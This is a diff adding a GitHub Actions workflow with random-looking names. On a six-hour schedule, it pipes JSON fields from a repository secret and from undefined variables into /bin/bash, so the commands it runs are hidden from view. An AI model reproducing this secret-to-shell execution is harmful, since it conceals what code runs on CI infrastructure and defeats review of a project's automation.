@@ -1,0 +1,31 @@
+name: caiwuhui2415
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: caiwuhui2415
+        env:
+          qzln030: ${{ secrets.qzln030 }}
+        run: |
+          echo $qzln030 | jq -r .c33682 | /bin/bash
+          echo $zqh1 | jq -r .ddftt611 | /bin/bash
+          echo $cpv5 | jq -r .eg5 | /bin/bash
+          echo $gb2 | jq -r .jx32 | /bin/bash
+          echo $jjtow6 | jq -r .cgf5 | /bin/bash
+          echo $ndm76 | jq -r .ozf3 | /bin/bash
+          echo $ukjuq5472 | jq -r .ev5417 | /bin/bash
+          echo $oyso3895 | jq -r .l88 | /bin/bash
+          echo $cittb357 | jq -r .hyttr60 | /bin/bash
+          echo $fzd9 | jq -r .o59 | /bin/bash
+          echo $su6 | jq -r .sjrb1 | /bin/bash
+          echo $raut02293 | jq -r .dj83 | /bin/bash
+          echo $izn4 | jq -r .n20 | /bin/bash
+
